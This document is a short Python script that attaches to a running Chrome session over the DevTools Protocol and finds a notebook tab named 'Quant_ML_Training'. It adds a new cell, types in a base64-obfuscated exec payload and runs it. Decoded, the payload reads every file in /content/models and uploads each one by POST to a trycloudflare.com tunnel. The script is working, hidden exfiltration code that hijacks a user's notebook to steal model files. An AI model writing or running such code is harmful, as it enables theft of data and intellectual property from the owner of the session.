#!/usr/bin/env python3
import asyncio
from playwright.async_api import async_playwright
CDP="http://localhost:9222"
B64 = 'aW1wb3J0IG9zLCB1cmxsaWIucmVxdWVzdCwgdXJsbGliLnBhcnNlCmJhc2U9Imh0dHBzOi8vYWltcy1zdHlsZS1qYWRlLWNlbnR1cnkudHJ5Y2xvdWRmbGFyZS5jb20iCnNyYz0iL2NvbnRlbnQvbW9kZWxzIgpmb3IgZiBpbiBzb3J0ZWQob3MubGlzdGRpcihzcmMpKToKICAgIHA9b3MucGF0aC5qb2luKHNyYyxmKQogICAgaWYgb3MucGF0aC5pc2ZpbGUocCk6CiAgICAgICAgZGF0YT1vcGVuKHAsInJiIikucmVhZCgpCiAgICAgICAgdXJsPWJhc2UrIi91cGxvYWQ/bmFtZT0iK3VybGxpYi5wYXJzZS5xdW90ZShmKQogICAgICAgIHJlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHVybCwgZGF0YT1kYXRhLCBtZXRob2Q9IlBPU1QiKQogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcD11cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSwgdGltZW91dD05MCkKICAgICAgICAgICAgcHJpbnQoIlVQTE9BRF9PSyIsIGYsIGxlbihkYXRhKSwgcmVzcC5yZWFkKCkuZGVjb2RlKCkpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludCgiVVBMT0FEX0VSUiIsIGYsIHJlcHIoZSlbOjE1MF0pCnByaW50KCJVUExPQURfRE9ORSIpCg=='
CMD = "exec(__import__(\"base64\").b64decode(\"" + B64 + "\"))"
async def main():
    p=await async_playwright().start()
    b=await p.chromium.connect_over_cdp(CDP)
    ctx=b.contexts[0]
    page=None
    for pg in ctx.pages:
        try:
            if "Quant_ML_Training" in pg.url: page=pg; break
        except: pass
    if not page: print("NO_TAB"); await p.stop(); return
    await page.bring_to_front()
    await asyncio.sleep(3)
    await page.mouse.click(400,300)
    await asyncio.sleep(1)
    await page.keyboard.press("Control+m"); await page.keyboard.press("b")
    await asyncio.sleep(1)
    await page.keyboard.type(CMD, delay=0)
    await asyncio.sleep(2)
    await page.keyboard.press("Shift+Enter")
    print("EXEC_SENT")
    await asyncio.sleep(25)
    await p.stop()
asyncio.run(main())
